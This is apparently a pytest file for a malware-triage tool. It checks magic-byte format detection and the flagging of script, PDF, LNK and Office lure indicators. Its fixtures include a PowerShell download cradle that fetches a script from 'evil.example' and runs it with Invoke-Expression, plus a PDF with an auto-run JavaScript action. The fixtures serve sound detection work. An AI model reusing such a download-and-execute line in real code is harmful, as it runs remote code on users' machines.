"""Format-aware static triage for the non-PE lures real campaigns use
(scripts, LNK shortcuts, Office/RTF documents, PDFs). Before this, capa
and the PE tools produced essentially no evidence for these formats, so
neither the deterministic gate nor an LLM adjudicator had anything to
reason over. Sample-derived text (script bodies, macro source, LNK
arguments, URLs) is emitted under locators that mark it as
attacker-controlled (see malagent.judge.bundle.provenance_of)."""
from __future__ import annotations
import io
import zipfile

from malagent.contracts import AnalysisState, Provenance, Sample
from malagent.format_triage import (FormatTool, LnkTool, OfficeMacroTool, PdfTool, ScriptTool,
                                    detect_format)


def _state(tmp_path, data: bytes, name="s.bin"):
    p = tmp_path / name
    p.write_bytes(data)
    return AnalysisState(run_id="r1", sample=Sample(
        sha256="a" * 64, md5="b" * 32, path=str(p), file_type="unknown", size=len(data),
        provenance=Provenance()))


def _ooxml() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document/>")
    return buf.getvalue()


def test_detect_format_basic_magic():
    assert detect_format(b"MZ\x90\x00") == "pe"
    assert detect_format(b"\x7fELF\x02") == "elf"
    assert detect_format(b"%PDF-1.7\n") == "pdf"
    assert detect_format(b"{\\rtf1\\ansi") == "rtf"
    assert detect_format(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 8) == "ole"
    assert detect_format(b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 8) == "lnk"
    assert detect_format(_ooxml()) == "ooxml"
    assert detect_format(b"PK\x03\x04" + b"\x00" * 30) == "zip"


def test_detect_format_scripts_by_content():
    assert detect_format(b"var s = new ActiveXObject('WScript.Shell');\n") == "script_js"
    assert detect_format(b"Set o = CreateObject(\"WScript.Shell\")\r\nDim x\r\n") == "script_vbs"
    assert detect_format(b"$c = New-Object Net.WebClient\nInvoke-Expression $c\n") == "script_ps1"
    assert detect_format(b"@echo off\r\nset X=1\r\n") == "script_bat"
    assert detect_format(b"<html><hta:application id=x></hta:application>") == "script_hta"


def test_format_tool_records_format_evidence(tmp_path):
    sr = FormatTool().run(_state(tmp_path, b"%PDF-1.4\n"))
    assert sr.evidence[0].locator == "format:type"
    assert sr.evidence[0].excerpt == "pdf"


def test_script_tool_flags_download_and_exec_and_keeps_excerpt(tmp_path):
    src = (b"$w = New-Object Net.WebClient\n"
           b"$p = $w.DownloadString('http://evil.example/p.ps1')\n"
           b"Invoke-Expression $p\n")
    sr = ScriptTool().run(_state(tmp_path, src))
    locs = {e.locator for e in sr.evidence}
    assert "script:excerpt" in locs
    assert any(l.startswith("script:indicator:communication") for l in locs)
    assert any(l.startswith("script:indicator:execution") for l in locs)
    assert any(f.severity == "medium" for f in sr.findings)


def test_script_tool_skips_binary(tmp_path):
    sr = ScriptTool().run(_state(tmp_path, b"MZ\x00\x01\x02" * 50))
    assert sr.status == "skipped"


def test_pdf_tool_flags_javascript_openaction(tmp_path):
    pdf = b"%PDF-1.5\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n"
    sr = PdfTool().run(_state(tmp_path, pdf))
    locs = {e.locator for e in sr.evidence}
    assert "pdf:/JavaScript" in locs and "pdf:/OpenAction" in locs
    assert any(f.severity == "medium" for f in sr.findings)


def test_pdf_tool_plain_pdf_has_no_medium_findings(tmp_path):
    sr = PdfTool().run(_state(tmp_path, b"%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n"))
    assert sr.status == "ok"
    assert not any(f.severity == "medium" for f in sr.findings)


def test_lnk_tool_skips_non_lnk(tmp_path):
    assert LnkTool().run(_state(tmp_path, b"%PDF-1.4")).status == "skipped"


def test_office_tool_skips_non_office(tmp_path):
    assert OfficeMacroTool().run(_state(tmp_path, b"%PDF-1.4")).status == "skipped"


def test_office_tool_runs_on_ooxml_without_macros(tmp_path):
    sr = OfficeMacroTool().run(_state(tmp_path, _ooxml()))
    assert sr.status == "ok"
    assert not any(e.locator.startswith("office:autoexec") for e in sr.evidence)


def test_format_indicators_count_toward_the_corroboration_gate():
    """A non-PE lure (no EMBER decision possible) is judged by the
    deterministic gate; its format indicators must be able to corroborate."""
    from malagent.contracts import EvidenceRecord, Finding, StageResult
    from malagent.reporter import build_verdict
    s = AnalysisState(run_id="r1", sample=Sample(sha256="a" * 64, md5="b" * 32, path="x",
                      file_type="unknown", size=1, provenance=Provenance()))
    cats = ["communication", "execution", "anti-analysis"]
    s.evidence = [EvidenceRecord(evidence_id=f"e{i}", artifact_id="a",
                                 locator=f"script:indicator:{c}:x", excerpt="x") for i, c in enumerate(cats)]
    s.findings = [Finding(finding_id=f"f{i}", claim="x", category="capability", severity="medium",
                          confidence=0.9, evidence=[f"e{i}"], grounded=True) for i in range(3)]
    s.stage_results = [StageResult(stage="triage", status="ok")]
    assert build_verdict(s).verdict in ("malicious", "suspicious")


def test_triage_agent_runs_format_tools():
    from malagent import agents
    import inspect
    src = inspect.getsource(agents.triage_agent)
    for tool in ("FormatTool", "ScriptTool", "LnkTool", "OfficeMacroTool", "PdfTool"):
        assert tool in src
